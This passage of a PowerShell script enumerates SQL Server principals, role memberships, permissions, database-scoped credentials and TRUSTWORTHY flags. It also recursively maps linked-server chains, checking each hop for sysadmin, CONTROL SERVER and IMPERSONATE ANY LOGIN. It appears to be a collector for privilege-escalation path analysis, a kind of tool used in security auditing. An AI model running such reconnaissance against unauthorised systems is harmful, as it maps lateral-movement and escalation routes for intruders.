                # Include target in key for principal-specific permissions
                "$permission-$majorID"  # e.g., "ALTER-365" for ALTER on principal 365
            } else {
                $permission  # e.g., "CONNECT SQL" for server-level permissions
            }
            
            if (-not $explicitServerPermissions[$principalID].ContainsKey($permKey)) {
                $explicitServerPermissions[$principalID][$permKey] = @{
                    "ClassValue" = $classValue
                    "ClassDesc" = $classDesc
                    "State" = $stateDesc
                    "MajorID" = $majorID
                    "Permission" = $permission
                }
            }
        }
    
        # Create a lookup table for server principal ObjectIdentifiers
        $serverPrincipalObjectIds = @{}
    
        # Process server principals first to create the ObjectIdentifier lookup
        foreach ($row in $principalsTable.Tables[0].Rows) {
            $principalName = $row["Name"].ToString()
            $principalID = $row["PrincipalID"].ToString()
            
            # Create the ObjectIdentifier for this principal
            $principalObjectId = "$principalName@$serverObjectIdentifier"
            
            # Add to lookup table
            $serverPrincipalObjectIds[$principalID] = $principalObjectId
        }
    
        # Process server principals using the unified function
        $serverPrincipalsResult = Process-SQLPrincipals -PrincipalsTable $principalsTable `
                                                    -MembershipsByPrincipal $serverMembershipsByPrincipal `
                                                    -ExplicitPermissions $explicitServerPermissions `
                                                    -ObjectIdentifierBase $serverObjectIdentifier `
                                                    -FixedRolePermissions $fixedServerRolePermissions `
                                                    -PrincipalObjectIds $serverPrincipalObjectIds `
                                                    -MembersByRole $serverMembersByRole `
                                                    -PrincipalLevel "Server" `
                                                    -PrincipalCredentialMap $principalCredentialMap
    
        $serverInfo.ServerPrincipals = $serverPrincipalsResult.Principals
        # Make sure we properly set the flag for domain principals with sysadmin privileges
        $serverInfo.DomainPrincipalsWithControlServer = $serverPrincipalsResult.DomainPrincipalsWithControlServer
        $serverInfo.DomainPrincipalsWithImpersonateAnyLogin = $serverPrincipalsResult.DomainPrincipalsWithImpersonateAnyLogin
        $serverInfo.DomainPrincipalsWithSecurityadmin = $serverPrincipalsResult.DomainPrincipalsWithSecurityadmin
        $serverInfo.DomainPrincipalsWithSysadmin = $serverPrincipalsResult.DomainPrincipalsWithSysadmin
        $serverInfo.IsAnyDomainPrincipalSysadmin = $serverPrincipalsResult.DomainPrincipalHasSysadmin
    
        # Track local groups with SQL logins and their domain members
        $localGroupsWithLogins = @{}
    
        # Process local groups that have SQL Server logins
        foreach ($principal in $serverInfo.ServerPrincipals) {
            # Check if this is a local Windows group
            if ($principal.TypeDescription -eq "WINDOWS_GROUP") {
                $isLocalGroup = $false
                $localGroupName = ""
                
                # Check for BUILTIN groups
                if ($principal.Name -match "^BUILTIN\\(.+)$") {
                    $isLocalGroup = $true
                    $localGroupName = $matches[1]
                }
                # Check for computer-specific local groups (case-insensitive)
                elseif ($principal.Name -match "(?i)^$([regex]::Escape($serverHostname))\\(.+)$") {
                    $isLocalGroup = $true
                    $localGroupName = $matches[1]
                }
                
                if ($isLocalGroup) {
                    Write-Host "Enumerating members of local group: $localGroupName"
                    
                    # Get members of the local group
                    $groupMembers = Get-LocalGroupMembers -ComputerName $serverHostname -GroupName $localGroupName
                    
                    if ($groupMembers.Count -gt 0) {
                        Write-Host "Found $($groupMembers.Count) domain members in $localGroupName"
                    }
                    else {
                        Write-Host "No domain members found in $localGroupName"
                    }
                    $localGroupsWithLogins[$principal.ObjectIdentifier] = @{
                        Principal = $principal
                        Members = $groupMembers
                    }
                }
            }
        }
    
        # Add to server info
        $serverInfo.LocalGroupsWithLogins = $localGroupsWithLogins
    
        # Get all databases
        $databasesQuery = @"
SELECT name
FROM sys.databases
WHERE state = 0 -- Only online databases
ORDER BY name
"@
        $databasesCommand = New-Object System.Data.SqlClient.SqlCommand($databasesQuery, $connection)
        $databasesReader = $databasesCommand.ExecuteReader()
    
        $databases = @()
        while ($databasesReader.Read()) {
            $databases += $databasesReader["name"].ToString()
        }
        $databasesReader.Close()
    
        # Process each database
        foreach ($databaseName in $databases) {
            Write-Host "Processing database: $databaseName"
            
            # Create the ObjectIdentifier for this database
            $databaseObjectId = "$serverObjectIdentifier\$databaseName"
            
            # Create a database object
            $databaseObj = [PSCustomObject]@{
                Name = $databaseName
                ObjectIdentifier = $databaseObjectId
                DatabasePrincipals = @()
            }
                    
            # Try to change connection to current database
            try {
                $connection.ChangeDatabase($databaseName)
            }
            catch {
                Write-Warning "Cannot access database '$databaseName': $($_.Exception.Message)"
                continue  # Skip to next database
            }
    
            # Get TRUSTWORTHY setting for the database
            $trustworthyQuery = "SELECT is_trustworthy_on FROM sys.databases WHERE name = @dbName"
            $trustworthyCommand = New-Object System.Data.SqlClient.SqlCommand($trustworthyQuery, $connection)
            $trustworthyCommand.Parameters.AddWithValue("@dbName", $databaseName) | Out-Null
            $isTrustworthy = $trustworthyCommand.ExecuteScalar()    
            $databaseObj | Add-Member -MemberType NoteProperty -Name "TRUSTWORTHY" -Value $isTrustworthy
            
            # Get all database principals
            $dbPrincipalsQuery = @"
SELECT 
CONVERT(VARCHAR, create_date, 120) AS CreateDate,
CASE WHEN is_fixed_role = 1 THEN '1' ELSE '0' END AS IsFixedRole,
CONVERT(VARCHAR, modify_date, 120) AS ModifyDate,
name AS Name,
ISNULL(CONVERT(VARCHAR, owning_principal_id), '') AS OwningPrincipalID,
CONVERT(VARCHAR, principal_id) AS PrincipalID,
'0x' + CONVERT(VARCHAR(MAX), sid, 2) AS SID,
type AS Type,
type_desc AS TypeDescription,
CONVERT(VARCHAR, default_schema_name) AS DefaultSchemaName
FROM sys.database_principals
ORDER BY principal_id
"@
            # Get database owner information
            $dbOwnerQuery = @"
SELECT 
d.name AS DatabaseName,
d.owner_sid,
sp.name AS OwnerLoginName,
sp.principal_id AS OwnerPrincipalID,
sp.type_desc AS OwnerType
FROM sys.databases d
LEFT JOIN sys.server_principals sp ON d.owner_sid = sp.sid
WHERE d.name = @dbName
"@
            $dbOwnerCommand = New-Object System.Data.SqlClient.SqlCommand($dbOwnerQuery, $connection)
            $dbOwnerCommand.Parameters.AddWithValue("@dbName", $databaseName) | Out-Null
            $dbOwnerReader = $dbOwnerCommand.ExecuteReader()
            
            if ($dbOwnerReader.Read()) {
                $ownerLoginName = if (-not [System.DBNull]::Value.Equals($dbOwnerReader["OwnerLoginName"])) { 
                    $dbOwnerReader["OwnerLoginName"].ToString() 
                } else { 
                    "Unknown" 
                }
                
                $ownerPrincipalID = if (-not [System.DBNull]::Value.Equals($dbOwnerReader["OwnerPrincipalID"])) { 
                    $dbOwnerReader["OwnerPrincipalID"].ToString() 
                } else { 
                    $null 
                }
                
                # Create owner object identifier
                $ownerObjectIdentifier = if ($ownerPrincipalID) {
                    "$ownerLoginName@$serverObjectIdentifier"
                } else {
                    $null
                }
                
                $databaseObj | Add-Member -MemberType NoteProperty -Name "OwnerLoginName" -Value $ownerLoginName
                $databaseObj | Add-Member -MemberType NoteProperty -Name "OwnerPrincipalID" -Value $ownerPrincipalID
                $databaseObj | Add-Member -MemberType NoteProperty -Name "OwnerObjectIdentifier" -Value $ownerObjectIdentifier
            } else {
                $databaseObj | Add-Member -MemberType NoteProperty -Name "OwnerLoginName" -Value "Unknown"
                $databaseObj | Add-Member -MemberType NoteProperty -Name "OwnerPrincipalID" -Value $null
                $databaseObj | Add-Member -MemberType NoteProperty -Name "OwnerObjectIdentifier" -Value $null
            }
            
            $dbOwnerReader.Close()
    
            $dbPrincipalsCommand = New-Object System.Data.SqlClient.SqlCommand($dbPrincipalsQuery, $connection)
            $dbPrincipalsAdapter = New-Object System.Data.SqlClient.SqlDataAdapter($dbPrincipalsCommand)
            $dbPrincipalsTable = New-Object System.Data.DataSet
            $dbPrincipalsAdapter.Fill($dbPrincipalsTable) | Out-Null
            
            # Get all direct database role memberships at once (optimized approach)
            $allDBRoleMembershipsQuery = @"
SELECT 
m.principal_id AS MemberPrincipalID,
r.principal_id AS RolePrincipalID,
r.name AS RoleName
FROM sys.database_role_members rm
JOIN sys.database_principals m ON rm.member_principal_id = m.principal_id
JOIN sys.database_principals r ON rm.role_principal_id = r.principal_id
ORDER BY m.principal_id, r.name
"@
            $allDBRoleMembershipsCommand = New-Object System.Data.SqlClient.SqlCommand($allDBRoleMembershipsQuery, $connection)
            $allDBRoleMembershipsAdapter = New-Object System.Data.SqlClient.SqlDataAdapter($allDBRoleMembershipsCommand)
            $allDBRoleMembershipsTable = New-Object System.Data.DataSet
            $allDBRoleMembershipsAdapter.Fill($allDBRoleMembershipsTable) | Out-Null
    
            # Create a hashtable for quick lookup of database role memberships by principal ID
            $dbMembershipsByPrincipal = @{}
            foreach ($row in $allDBRoleMembershipsTable.Tables[0].Rows) {
                $memberPrincipalID = $row["MemberPrincipalID"].ToString()
                
                if (-not $dbMembershipsByPrincipal.ContainsKey($memberPrincipalID)) {
                    $dbMembershipsByPrincipal[$memberPrincipalID] = @()
                }
                
                # Create the ObjectIdentifier for this database role
                $roleName = $row["RoleName"].ToString()
                $roleObjectId = "$roleName@$serverObjectIdentifier\$databaseName"
                
                $dbMembershipsByPrincipal[$memberPrincipalID] += [PSCustomObject]@{
                    PrincipalID = $row["RolePrincipalID"].ToString()
                    ObjectIdentifier = $roleObjectId
                }
            }
    
            # Create reverse lookup - which principals are members of each role
            $dbMembersByRole = @{}
            foreach ($row in $allDBRoleMembershipsTable.Tables[0].Rows) {
                $rolePrincipalID = $row["RolePrincipalID"].ToString()
                $memberPrincipalID = $row["MemberPrincipalID"].ToString()
                
                if (-not $dbMembersByRole.ContainsKey($rolePrincipalID)) {
                    $dbMembersByRole[$rolePrincipalID] = @()
                }
                
                $dbMembersByRole[$rolePrincipalID] += $memberPrincipalID
            }        
            
            # Get explicit database permissions for all principals
            $explicitDBPermissionsQuery = @"
SELECT 
dp.name AS PrincipalName,
dp.principal_id AS PrincipalID,
dp.type_desc AS PrincipalType,
p.permission_name AS PermissionName,
p.state_desc AS StateDesc,
p.class AS ClassValue,
CASE p.class
    WHEN 0 THEN 'DATABASE'
    WHEN 4 THEN 'DATABASE_PRINCIPAL'
    ELSE 'OTHER'
END AS ClassDesc,
CAST(p.major_id AS VARCHAR) AS MajorID
FROM sys.database_permissions p
JOIN sys.database_principals dp ON p.grantee_principal_id = dp.principal_id
WHERE p.class IN (0, 4)
ORDER BY dp.name, p.permission_name
"@
            $explicitDBPermissionsCommand = New-Object System.Data.SqlClient.SqlCommand($explicitDBPermissionsQuery, $connection)
            $explicitDBPermissionsAdapter = New-Object System.Data.SqlClient.SqlDataAdapter($explicitDBPermissionsCommand)
            $explicitDBPermissionsTable = New-Object System.Data.DataSet
            $explicitDBPermissionsAdapter.Fill($explicitDBPermissionsTable) | Out-Null
    
            $explicitDBPermissions = @{}
            foreach ($row in $explicitDBPermissionsTable.Tables[0].Rows) {
                $principalID = $row["PrincipalID"].ToString()
                $permission = $row["PermissionName"].ToString()
                $class = $row["ClassValue"].ToString()
                $classDesc = $row["ClassDesc"].ToString()
                $stateDesc = $row["StateDesc"].ToString()
                $majorID = $row["MajorID"].ToString()
                
                if (-not $explicitDBPermissions.ContainsKey($principalID)) {
                    $explicitDBPermissions[$principalID] = @{}
                }
    
                # Create a unique key for the permission that includes the target
                # This prevents overwriting when same permission exists on different targets
                $permKey = if ($class -eq "4" -and $majorID -ne "0") {
                    # Include target in key for principal-specific permissions
                    "$permission-$majorID"  # e.g., "CONTROL-123" for CONTROL on principal 123
                } else {
                    $permission  # e.g., "CONTROL" for database-level permissions
                }
    
                if (-not $explicitDBPermissions[$principalID].ContainsKey($permKey)) {
                    $explicitDBPermissions[$principalID][$permKey] = @{
                        "ClassValue" = $class
                        "ClassDesc" = $classDesc
                        "State" = $stateDesc
                        "MajorID" = $majorID
                        "Permission" = $permission
                    }
                }
            }
    
            # Create a lookup table for database principal ObjectIdentifiers
            $dbPrincipalObjectIds = @{}
    
            # First pass to create the ObjectIdentifier lookup
            foreach ($row in $dbPrincipalsTable.Tables[0].Rows) {
                $principalName = $row["Name"].ToString()
                $principalID = $row["PrincipalID"].ToString()
                
                # Create the ObjectIdentifier for this principal
                $dbPrincipalObjectId = "$principalName@$serverObjectIdentifier\$databaseName"
                
                # Add to lookup table
                $dbPrincipalObjectIds[$principalID] = $dbPrincipalObjectId
            }
            
            # Process database principals using the unified function
            $dbPrincipalsResult = Process-SQLPrincipals -PrincipalsTable $dbPrincipalsTable `
                                                    -MembershipsByPrincipal $dbMembershipsByPrincipal `
                                                    -ExplicitPermissions $explicitDBPermissions `
                                                    -ObjectIdentifierBase $serverObjectIdentifier `
                                                    -FixedRolePermissions $fixedDatabaseRolePermissions `
                                                    -PrincipalObjectIds $dbPrincipalObjectIds `
                                                    -MembersByRole $dbMembersByRole `
                                                    -PrincipalLevel "Database" `
                                                    -DatabaseName $databaseName `
                                                    -Connection $connection
            
            $databaseObj.DatabasePrincipals = $dbPrincipalsResult.Principals
            $serverInfo.Databases += $databaseObj
    
            # Get database-scoped credentials for this database
            $dbCredentialsQuery = @"
SELECT 
credential_id,
name AS credential_name,
credential_identity,
create_date,
modify_date
FROM sys.database_scoped_credentials
ORDER BY credential_id
"@
            try {
                $dbCredentialsCommand = New-Object System.Data.SqlClient.SqlCommand($dbCredentialsQuery, $connection)
                $dbCredentialsAdapter = New-Object System.Data.SqlClient.SqlDataAdapter($dbCredentialsCommand)
                $dbCredentialsTable = New-Object System.Data.DataSet
                $dbCredentialsAdapter.Fill($dbCredentialsTable) | Out-Null
    
                # Process database-scoped credentials
                $dbCredentials = @()
                foreach ($row in $dbCredentialsTable.Tables[0].Rows) {
                    $credentialIdentity = $row["credential_identity"].ToString()
                    
                    # Check if this appears to be an AD account
                    $resolvedPrincipal = Resolve-DomainPrincipal $credentialIdentity
                    
                    $dbCredential = [PSCustomObject]@{
                        CredentialId = $row["credential_id"].ToString()
                        CredentialName = $row["credential_name"].ToString()
                        CredentialIdentity = $credentialIdentity
                        CreateDate = $row["create_date"].ToString()
                        ModifyDate = $row["modify_date"].ToString()
                        IsDomainPrincipal = $resolvedPrincipal.IsDomainPrincipal
                        ResolvedPrincipal = $resolvedPrincipal
                        ResolvedSID = $resolvedPrincipal.SID
                        ResolvedType = $resolvedPrincipal.Type
                        Database = $databaseName
                    }
                    $dbCredentials += $dbCredential
                }
                
                # Add to database object
                $databaseObj | Add-Member -MemberType NoteProperty -Name "DatabaseScopedCredentials" -Value $dbCredentials
            }
            catch {
                # Database-scoped credentials might not exist in older SQL versions
                Write-Verbose "Unable to enumerate database-scoped credentials for ${databaseName}: $_"
                $databaseObj | Add-Member -MemberType NoteProperty -Name "DatabaseScopedCredentials" -Value @()
            }
        }
    
        # Get linked servers information
        Write-Host "Enumerating linked servers..."
    
        # Generate a unique suffix for the temp table to avoid conflicts
        $tempTableSuffix = (Get-Date).Ticks.ToString().Substring(10)
        $tempTableName = "##LinkedServerMap_$tempTableSuffix"
    
        $linkedServersQuery = @"
-- Create temp table for linked server discovery
CREATE TABLE $tempTableName (
ID INT IDENTITY(1,1),
Level INT,
Path NVARCHAR(MAX),
SourceServer NVARCHAR(128),
LinkedServer NVARCHAR(128),
DataSource NVARCHAR(128),
Product NVARCHAR(128),
Provider NVARCHAR(128),
DataAccess BIT,
RPCOut BIT,
LocalLogin NVARCHAR(128),
UsesImpersonation BIT,
RemoteLogin NVARCHAR(128),
RemoteIsSysadmin BIT DEFAULT 0,
RemoteIsSecurityAdmin BIT DEFAULT 0,
RemoteCurrentLogin NVARCHAR(128),
RemoteServerRoles NVARCHAR(MAX),
RemoteIsMixedMode BIT DEFAULT 0,
RemoteHasControlServer BIT DEFAULT 0,
RemoteHasImpersonateAnyLogin BIT DEFAULT 0,
ErrorMsg NVARCHAR(MAX) NULL
);

-- Insert local server's linked servers (Level 0)
INSERT INTO $tempTableName (Level, Path, SourceServer, LinkedServer, DataSource, Product, Provider, DataAccess, RPCOut,
                            LocalLogin, UsesImpersonation, RemoteLogin)
SELECT
0,
@@SERVERNAME + ' -> ' + s.name,
@@SERVERNAME,
s.name,
s.data_source,
s.product,
s.provider,
s.is_data_access_enabled,
s.is_rpc_out_enabled,
COALESCE(sp.name, 'All Logins'),
ll.uses_self_credential,
ll.remote_name
FROM sys.servers s
INNER JOIN sys.linked_logins ll ON s.server_id = ll.server_id
LEFT JOIN sys.server_principals sp ON ll.local_principal_id = sp.principal_id
WHERE s.is_linked = 1;

-- Check privileges and auth mode for Level 0 entries
DECLARE @CheckID INT, @CheckLinkedServer NVARCHAR(128);
DECLARE @PrivilegeResults TABLE (
IsSysadmin INT,
IsSecurityAdmin INT,
CurrentLogin NVARCHAR(128),
ServerRoles NVARCHAR(MAX),
IsMixedMode INT,
HasControlServer INT,
HasImpersonateAnyLogin INT
);

DECLARE check_cursor CURSOR FOR
SELECT ID, LinkedServer FROM $tempTableName WHERE Level = 0;

OPEN check_cursor;
FETCH NEXT FROM check_cursor INTO @CheckID, @CheckLinkedServer;

WHILE @@FETCH_STATUS = 0
BEGIN
DELETE FROM @PrivilegeResults;

BEGIN TRY
    DECLARE @CheckSQL NVARCHAR(MAX);
    SET @CheckSQL = 'SELECT * FROM OPENQUERY([' + @CheckLinkedServer + '], ''
        WITH RoleHierarchy AS (
            -- Start with the current user
            SELECT 
                p.principal_id,
                p.name AS principal_name,
                CAST(p.name AS NVARCHAR(MAX)) AS path,
                0 AS level
            FROM sys.server_principals p
            WHERE p.name = SYSTEM_USER
            
            UNION ALL
            
            -- Recursively find all roles this principal belongs to
            SELECT 
                r.principal_id,
                r.name AS principal_name,
                rh.path + '''' -> '''' + r.name,
                rh.level + 1
            FROM RoleHierarchy rh
            INNER JOIN sys.server_role_members rm ON rm.member_principal_id = rh.principal_id
            INNER JOIN sys.server_principals r ON rm.role_principal_id = r.principal_id
            WHERE rh.level < 10
        ),
        AllPermissions AS (
            -- Get all permissions for the user and all their roles
            SELECT DISTINCT
                sp.permission_name,
                sp.state,
                rh.principal_name,
                rh.path
            FROM RoleHierarchy rh
            INNER JOIN sys.server_permissions sp ON sp.grantee_principal_id = rh.principal_id
            WHERE sp.state = ''''G''''
        )
        SELECT
            IS_SRVROLEMEMBER(''''sysadmin'''') AS IsSysadmin,
            IS_SRVROLEMEMBER(''''securityadmin'''') AS IsSecurityAdmin,
            SYSTEM_USER AS CurrentLogin,
            STUFF((
                SELECT '''', '''' + r.name
                FROM sys.server_role_members rm
                INNER JOIN sys.server_principals r ON rm.role_principal_id = r.principal_id
                INNER JOIN sys.server_principals m ON rm.member_principal_id = m.principal_id
                WHERE m.name = SYSTEM_USER
                FOR XML PATH('''''''')
            ), 1, 2, '''''''') AS ServerRoles,
            CASE SERVERPROPERTY(''''IsIntegratedSecurityOnly'''')
                WHEN 1 THEN 0
                WHEN 0 THEN 1
            END AS IsMixedMode,
            CASE WHEN EXISTS (
                SELECT 1 FROM AllPermissions 
                WHERE permission_name = ''''CONTROL SERVER''''
            ) THEN 1 ELSE 0 END AS HasControlServer,
            CASE WHEN EXISTS (
                SELECT 1 FROM AllPermissions 
                WHERE permission_name = ''''IMPERSONATE ANY LOGIN''''
            ) THEN 1 ELSE 0 END AS HasImpersonateAnyLogin
    '')';
    
    INSERT INTO @PrivilegeResults
    EXEC sp_executesql @CheckSQL;
    
    UPDATE $tempTableName
    SET RemoteIsSysadmin = (SELECT IsSysadmin FROM @PrivilegeResults),
        RemoteIsSecurityAdmin = (SELECT IsSecurityAdmin FROM @PrivilegeResults),
        RemoteCurrentLogin = (SELECT CurrentLogin FROM @PrivilegeResults),
        RemoteServerRoles = (SELECT ServerRoles FROM @PrivilegeResults),
        RemoteIsMixedMode = (SELECT IsMixedMode FROM @PrivilegeResults),
        RemoteHasControlServer = (SELECT HasControlServer FROM @PrivilegeResults),
        RemoteHasImpersonateAnyLogin = (SELECT HasImpersonateAnyLogin FROM @PrivilegeResults)
    WHERE ID = @CheckID;
    
END TRY
BEGIN CATCH
    UPDATE $tempTableName
    SET ErrorMsg = ERROR_MESSAGE()
    WHERE ID = @CheckID;
END CATCH

FETCH NEXT FROM check_cursor INTO @CheckID, @CheckLinkedServer;
END

CLOSE check_cursor;
DEALLOCATE check_cursor;

-- Recursive discovery
DECLARE @CurrentLevel INT
DECLARE @MaxLevel INT 
DECLARE @RowsToProcess INT
DECLARE @ProcessedServers TABLE (ServerName NVARCHAR(128));

-- Initialize variables separately for SQL Server 2005 compatibility
SET @CurrentLevel = 0
SET @MaxLevel = 10
SET @RowsToProcess = 1

WHILE @RowsToProcess > 0 AND @CurrentLevel < @MaxLevel
BEGIN
DECLARE @LinkedServer NVARCHAR(128), @Path NVARCHAR(MAX);

DECLARE process_cursor CURSOR FOR
    SELECT DISTINCT LinkedServer, MIN(Path)
    FROM $tempTableName
    WHERE Level = @CurrentLevel 
        AND LinkedServer NOT IN (SELECT ServerName FROM @ProcessedServers)
    GROUP BY LinkedServer;

OPEN process_cursor;
FETCH NEXT FROM process_cursor INTO @LinkedServer, @Path;

WHILE @@FETCH_STATUS = 0
BEGIN
    BEGIN TRY
        DECLARE @sql NVARCHAR(MAX);
        SET @sql = '
        INSERT INTO $tempTableName (Level, Path, SourceServer, LinkedServer, DataSource, Product, Provider, DataAccess, RPCOut,
                                        LocalLogin, UsesImpersonation, RemoteLogin)
        SELECT DISTINCT
            ' + CAST(@CurrentLevel + 1 AS NVARCHAR) + ',
            ''' + @Path + ' -> '' + s.name,
            ''' + @LinkedServer + ''',
            s.name,
            s.data_source,
            s.product,
            s.provider,
            s.is_data_access_enabled,
            s.is_rpc_out_enabled,
            COALESCE(sp.name, ''All Logins''),
            ll.uses_self_credential,
            ll.remote_name
        FROM [' + @LinkedServer + '].[master].[sys].[servers] s
        INNER JOIN [' + @LinkedServer + '].[master].[sys].[linked_logins] ll ON s.server_id = ll.server_id
        LEFT JOIN [' + @LinkedServer + '].[master].[sys].[server_principals] sp ON ll.local_principal_id = sp.principal_id
        WHERE s.is_linked = 1
            AND ''' + @Path + ''' NOT LIKE ''%'' + s.name + '' ->%''
            -- Don''t process linked servers that point to data sources we''ve already seen
            AND s.data_source NOT IN (
                SELECT DISTINCT DataSource 
                FROM $tempTableName 
                WHERE DataSource IS NOT NULL
            )';
        
        EXEC sp_executesql @sql;
        INSERT INTO @ProcessedServers VALUES (@LinkedServer);
        
    END TRY
    BEGIN CATCH
        -- Just record the error and continue
        INSERT INTO @ProcessedServers VALUES (@LinkedServer);
    END CATCH
    
    FETCH NEXT FROM process_cursor INTO @LinkedServer, @Path;
END

CLOSE process_cursor;
DEALLOCATE process_cursor;

-- Check privileges for newly discovered servers
DECLARE privilege_cursor CURSOR FOR
    SELECT ID, LinkedServer 
    FROM $tempTableName 
    WHERE Level = @CurrentLevel + 1 
        AND RemoteIsSysadmin IS NULL;

OPEN privilege_cursor;
FETCH NEXT FROM privilege_cursor INTO @CheckID, @CheckLinkedServer;

WHILE @@FETCH_STATUS = 0
BEGIN
    DELETE FROM @PrivilegeResults;
    
    BEGIN TRY
        DECLARE @CheckSQL2 NVARCHAR(MAX);
        SET @CheckSQL2 = 'SELECT * FROM OPENQUERY([' + @CheckLinkedServer + '], ''
            WITH RoleHierarchy AS (
                -- Start with the current user
                SELECT 
                    p.principal_id,
                    p.name AS principal_name,
                    CAST(p.name AS NVARCHAR(MAX)) AS path,
                    0 AS level
                FROM sys.server_principals p
                WHERE p.name = SYSTEM_USER
                
                UNION ALL
                
                -- Recursively find all roles this principal belongs to
                SELECT 
                    r.principal_id,
                    r.name AS principal_name,
                    rh.path + '''' -> '''' + r.name,
                    rh.level + 1
                FROM RoleHierarchy rh
                INNER JOIN sys.server_role_members rm ON rm.member_principal_id = rh.principal_id
                INNER JOIN sys.server_principals r ON rm.role_principal_id = r.principal_id
                WHERE rh.level < 10
            ),
            AllPermissions AS (
                -- Get all permissions for the user and all their roles
                SELECT DISTINCT
                    sp.permission_name,
                    sp.state,
                    rh.principal_name,
                    rh.path
                FROM RoleHierarchy rh
                INNER JOIN sys.server_permissions sp ON sp.grantee_principal_id = rh.principal_id
                WHERE sp.state = ''''G''''
            )
            SELECT
                IS_SRVROLEMEMBER(''''sysadmin'''') AS IsSysadmin,
                IS_SRVROLEMEMBER(''''securityadmin'''') AS IsSecurityAdmin,
                SYSTEM_USER AS CurrentLogin,
                STUFF((
                    SELECT '''', '''' + r.name
                    FROM sys.server_role_members rm
                    INNER JOIN sys.server_principals r ON rm.role_principal_id = r.principal_id
                    INNER JOIN sys.server_principals m ON rm.member_principal_id = m.principal_id
                    WHERE m.name = SYSTEM_USER
                    FOR XML PATH('''''''')
                ), 1, 2, '''''''') AS ServerRoles,
                CASE SERVERPROPERTY(''''IsIntegratedSecurityOnly'''')
                    WHEN 1 THEN 0
                    WHEN 0 THEN 1
                END AS IsMixedMode,
                CASE WHEN EXISTS (
                    SELECT 1 FROM AllPermissions 
                    WHERE permission_name = ''''CONTROL SERVER''''
                ) THEN 1 ELSE 0 END AS HasControlServer,
                CASE WHEN EXISTS (
                    SELECT 1 FROM AllPermissions 
                    WHERE permission_name = ''''IMPERSONATE ANY LOGIN''''
                ) THEN 1 ELSE 0 END AS HasImpersonateAnyLogin
        '')';
        
        INSERT INTO @PrivilegeResults
        EXEC sp_executesql @CheckSQL2;
        
        UPDATE $tempTableName
        SET RemoteIsSysadmin = (SELECT IsSysadmin FROM @PrivilegeResults),
            RemoteIsSecurityAdmin = (SELECT IsSecurityAdmin FROM @PrivilegeResults),
            RemoteCurrentLogin = (SELECT CurrentLogin FROM @PrivilegeResults),
            RemoteServerRoles = (SELECT ServerRoles FROM @PrivilegeResults),
            RemoteIsMixedMode = (SELECT IsMixedMode FROM @PrivilegeResults),
            RemoteHasControlServer = (SELECT HasControlServer FROM @PrivilegeResults),
            RemoteHasImpersonateAnyLogin = (SELECT HasImpersonateAnyLogin FROM @PrivilegeResults)
        WHERE ID = @CheckID;
        
    END TRY
    BEGIN CATCH
        -- Just continue
    END CATCH
    
    FETCH NEXT FROM privilege_cursor INTO @CheckID, @CheckLinkedServer;
END

CLOSE privilege_cursor;
DEALLOCATE privilege_cursor;

-- Count new servers
SELECT @RowsToProcess = COUNT(DISTINCT LinkedServer) 
FROM $tempTableName 
WHERE Level = @CurrentLevel + 1
    AND LinkedServer NOT IN (SELECT ServerName FROM @ProcessedServers);

SET @CurrentLevel = @CurrentLevel + 1;
END

-- Return results
SELECT * FROM $tempTableName
ORDER BY Level, Path;
"@
        try {
            $linkedServersCommand = New-Object System.Data.SqlClient.SqlCommand($linkedServersQuery, $connection)
            $linkedServersCommand.CommandTimeout = $LinkedServerTimeout
            $linkedServersAdapter = New-Object System.Data.SqlClient.SqlDataAdapter($linkedServersCommand)
            $linkedServersTable = New-Object System.Data.DataSet
            $linkedServersAdapter.Fill($linkedServersTable) | Out-Null
    
            # Process linked servers
            $linkedServers = @()
            $linkedServerObjectIdMap = @{}  # Map DataSource to resolved ObjectIdentifier
    
            foreach ($row in $linkedServersTable.Tables[0].Rows) {
                $dataSource = $row["DataSource"].ToString()
                
                # Resolve DataSource to ObjectIdentifier
                $resolvedObjectId = Resolve-DataSourceToSid -DataSource $dataSource
                if (-not $resolvedObjectId) {
                    # Fallback to simple format if resolution fails
                    $resolvedObjectId = "LinkedServer:$dataSource"
                }

                # Resolve SourceServer to ObjectIdentifier
                $sourceServerEntry = $row["SourceServer"].ToString()
                $sourceServerOutput = $sourceServerEntry

                # Check if server is in SERVERNAME\INSTANCENAME format
                if ($sourceServerEntry -match '\\') {
                    $sourceServerName = $sourceServerEntry.Split('\')[0]

                    $resolvedSourceServer = Resolve-DomainPrincipal $sourceServerName
                    if ($resolvedSourceServer) {
                        $sourceServerOutput = $resolvedSourceServer.Name
                    }
                }
                
                # Store mapping for reuse
                $linkedServerObjectIdMap[$dataSource] = $resolvedObjectId
                
                $linkedServer = [PSCustomObject]@{
                    Level = [int]$row["Level"]
                    Path = $row["Path"].ToString()
                    SourceServer = $sourceServerOutput
                    LinkedServer = $row["LinkedServer"].ToString()
                    DataSource = $dataSource
                    ResolvedObjectIdentifier = $resolvedObjectId
                    Product = if (-not [System.DBNull]::Value.Equals($row["Product"])) { $row["Product"].ToString() } else { "" }
                    Provider = if (-not [System.DBNull]::Value.Equals($row["Provider"])) { $row["Provider"].ToString() } else { "" }
                    DataAccess = $row["DataAccess"] -eq $true
                    RPCOut = $row["RPCOut"] -eq $true
                    LocalLogin = $row["LocalLogin"].ToString()
                    UsesImpersonation = $row["UsesImpersonation"] -eq $true
                    RemoteLogin = if (-not [System.DBNull]::Value.Equals($row["RemoteLogin"])) { $row["RemoteLogin"].ToString() } else { "" }
                    RemoteIsSysadmin = if (-not [System.DBNull]::Value.Equals($row["RemoteIsSysadmin"])) { $row["RemoteIsSysadmin"] -eq 1 } else { $false }
                    RemoteIsSecurityAdmin = if (-not [System.DBNull]::Value.Equals($row["RemoteIsSecurityAdmin"])) { $row["RemoteIsSecurityAdmin"] -eq 1 } else { $false }
                    RemoteHasControlServer = if (-not [System.DBNull]::Value.Equals($row["RemoteHasControlServer"])) { $row["RemoteHasControlServer"] -eq 1 } else { $false }
                    RemoteHasImpersonateAnyLogin = if (-not [System.DBNull]::Value.Equals($row["RemoteHasImpersonateAnyLogin"])) { $row["RemoteHasImpersonateAnyLogin"] -eq 1 } else { $false }
                    RemoteCurrentLogin = if (-not [System.DBNull]::Value.Equals($row["RemoteCurrentLogin"])) { $row["RemoteCurrentLogin"].ToString() } else { "" }
                    RemoteServerRoles = if (-not [System.DBNull]::Value.Equals($row["RemoteServerRoles"])) { $row["RemoteServerRoles"].ToString() } else { "" }
                    RemoteIsMixedMode = if (-not [System.DBNull]::Value.Equals($row["RemoteIsMixedMode"])) { $row["RemoteIsMixedMode"] -eq 1 } else { $false }
                }
                $linkedServers += $linkedServer
            }
    
            # Add to server info
            $serverInfo.LinkedServers = $linkedServers
    
        } catch {
            Write-Host "Error during linked server enumeration: $_"
        } finally {
